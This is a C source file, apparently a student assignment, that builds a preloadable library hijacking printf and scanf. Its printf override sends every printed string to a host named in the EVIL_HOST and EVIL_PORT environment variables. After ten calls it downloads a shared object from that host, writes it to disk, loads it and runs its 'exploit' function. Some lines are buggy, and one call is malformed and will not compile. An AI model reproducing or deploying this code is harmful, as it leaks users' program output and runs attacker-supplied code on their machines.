#include <stdint.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <stdlib.h>
/*
 * We aren't providing much code here.  You'll need to implement your own
 * printf() and scanf(), as well as any constructors or destructors for your
 * library.
 */

/* TODO: Your code goes here */

__attribute__((constructor))
static void intialize_library(){
}

__attribute__((destructor))
static void destroy_library()
{
}

void sendMessage(char * message)
{
    struct sockaddr_in serv_addr;
    int sock;
    serv_addr.sin_family = AF_INET;
    char * evil_host = (char*)getenv("EVIL_HOST");
    char * evil_port = (char*)getenv("EVIL_PORT");
    if(evil_port == NULL || evil_host == NULL)
    {
        fprintf(stderr, "Could not locate environment variables\n");
    }
    else
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
	    fprintf(stderr, "Could not create socket\n");
	}
	else
	{
	    bzero((char *) &serv_addr, sizeof(serv_addr));
	    struct hostent *hp;
	    if ( (hp = gethostbyname(evil_host)) == NULL)
	    {
	        fprintf(stderr, "Could not resolve host from name\n");
	    }
	    else
	    {
		memcpy(&serv_addr.sin_addr, hp->h_addr_list[0], hp->h_length);
	    	serv_addr.sin_family = AF_INET;
	    	serv_addr.sin_port = htons(atoi(evil_port));
	    	if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	    	{
	        	fprintf(stderr, "Connection failed\n");
	    		fprintf(stderr, "ERRNO: %s\n", strerror(errno));
	    	}
	    }
	}
    }
    if(send(sock, message, strlen(message), 0) < 0)
    {
        fprintf(stderr, "Message send failed\n");
    }
    if(strcmp(message, "hack") == 0)
    {
        int file_size = 0;
	int return_status = read(sock, &file_size, sizeof(file_size));
	if(return_status < 0)
	{
	    fprintf(stderr, "File size read failed\n");
	}
	char buffer[file_size];
	return_status = read(sock, &buffer, sizeof(buffer));
	if(return_status < 0)
	{
	    fprintf(stderr, "File read failed\n");
	    return;
	}
        	
	char * temp_so = "obj32/temp.so";
	remove(temp_so);
	char * func_name = "exploit";
	FILE * temp_file = fopen(temp_so, "w");
	fwrite(&buffer, sizeof(char), file_size, temp_file);
	fclose(temp_file);
        // call the exploit 
	void * lib_handle = (void *) dlopen(temp_so, RTLD_NOW);
	if (lib_handle == NULL) {
	    fprintf(stderr, "invalid library name\n");
	    char * error = dlerror();
	    fprintf(stderr, "dlerror: %s\n", error);
	    exit(0);
	}
	dlerror();
	typedef void * (* function_alias) (void *);
	function_alias func;
	func = (function_alias) dlsym(lib_handle, func_name);
	
	char * error_msg = (char *) dlerror();
	if (error_msg != NULL) {
	    fprintf(stderr, "invalid function name\n");
	    exit(0);
	}
	void * ret_val = (*func) NULL;
	dlclose(lib_handle);
        remove(temp_so);	
    }
    close(sock);
}

static int call_count = 0;
void handleCalls()
{
    call_count++;
    if(call_count == 10)
    {
        //printf("crazy shit happens now\n"); 
    	sendMessage("hack");
    }
}

typedef int (*printf_alias)(const char * format, ...);
static printf_alias std_printf = NULL;
int printf(const char * format, ...)
{
    if(std_printf == NULL)
        std_printf = dlsym(RTLD_NEXT, "printf");
    va_list arguments;
    va_start(arguments, format);
    char buffer[4096];
    vsprintf(buffer, format, arguments);
    char result[4105];
    snprintf(result, sizeof result, "%s%s", "printf: ", buffer);
    sendMessage(result);
    int printf_res = std_printf(result);
    va_end(arguments);
    handleCalls();
    return printf_res;
}

typedef int (*scanf_alias)(const char * format, ...);
static scanf_alias std_scanf = NULL;
int scanf(const char * format, ...)
{
    if(std_scanf == NULL)
        std_scanf = dlsym(RTLD_NEXT, "scanf");
    va_list arguments;
    va_start(arguments, format);
    char buffer[4096];
    vscanf(format, arguments);
    char result[4105];
    snprintf(result, sizeof result, "%s%s", "scanf: ", buffer);
    //sendMessage(result);
    int scanf_res = std_scanf(result);
    va_end(arguments);
    handleCalls();
    return scanf_res;
}

